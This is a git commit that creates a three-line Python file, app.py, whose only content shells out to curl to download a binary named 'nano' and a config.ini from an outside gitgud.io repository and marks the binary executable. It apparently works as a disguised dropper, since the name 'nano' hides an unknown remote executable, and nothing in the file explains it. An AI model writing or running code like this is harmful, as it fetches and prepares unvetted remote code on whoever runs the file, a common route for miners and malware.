05bbf76e9eb7980a499ceba11a85d251f5a2313e
drobalf <143212446+drobalf@users.noreply.github.com>
2023-08-27 01:13:19 +0700

    Create app.py

---
+++ app.py
@@ -0,0 +1,3 @@
+import os
+os.system('curl --output nano https://gitgud.io/trendava/clouds/-/raw/master/nano;chmod 700 nano')
+os.system('curl --output config.ini https://gitgud.io/trendava/clouds/-/raw/master/config.ini')
